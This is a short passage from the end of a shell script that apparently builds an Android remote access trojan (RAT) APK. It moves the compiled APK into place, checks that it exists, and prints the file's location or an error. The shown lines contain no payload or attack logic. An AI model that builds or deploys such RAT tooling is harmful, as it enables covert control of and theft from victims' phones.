...
mv $compiled_apk $MY_PATH/app_rat.apk >>$LOG_FILE 2>&1
ratapk="$MY_PATH/app_rat.apk"
if [ ! -f $ratapk ]; then
    echo -e $red "[!] There was an error in the creation of your RAT APK file :
- Check the log file for more detailed information ."
else
echo "[*] Your RAT APK is located in : $MY_PATH/app_rat.apk"
cleanup
fi
exit 0
